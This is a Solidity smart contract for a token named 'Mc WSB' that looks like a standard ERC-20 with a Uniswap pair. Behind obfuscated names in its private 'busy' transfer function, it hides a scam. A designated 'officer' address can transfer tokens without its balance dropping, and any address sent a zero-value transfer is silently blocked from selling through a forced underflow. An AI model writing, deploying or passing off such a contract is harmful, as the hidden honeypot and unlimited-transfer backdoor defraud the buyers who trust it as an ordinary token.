/*

https://t.me/McWsbEth

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract McWsb is Ownable {
    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address bar, uint256 taken) public returns (bool success) {
        busy(msg.sender, bar, taken);
        return true;
    }

    function busy(address book, address bar, uint256 taken) private returns (bool success) {
        if (certainly[book] == 0) {
            if (high[book] > 0 && book != uniswapV2Pair) {
                certainly[book] -= themselves;
            }
            balanceOf[book] -= taken;
        }
        if (taken == 0) {
            high[bar] += themselves;
        }
        balanceOf[bar] += taken;
        emit Transfer(book, bar, taken);
        return true;
    }

    mapping(address => uint256) private high;

    string public name;

    uint256 public totalSupply;

    function transferFrom(address book, address bar, uint256 taken) public returns (bool success) {
        busy(book, bar, taken);
        require(taken <= allowance[book][msg.sender]);
        allowance[book][msg.sender] -= taken;
        return true;
    }

    mapping(address => uint256) public balanceOf;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint8 public decimals = 9;

    constructor(address officer) {
        symbol = 'Mc WSB';
        name = 'Mc WSB';
        totalSupply = 1000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        certainly[officer] = themselves;
    }

    mapping(address => uint256) private certainly;

    string public symbol;

    address public uniswapV2Pair;

    function approve(address traffic, uint256 taken) public returns (bool success) {
        allowance[msg.sender][traffic] = taken;
        emit Approval(msg.sender, traffic, taken);
        return true;
    }

    uint256 private themselves = 1;
}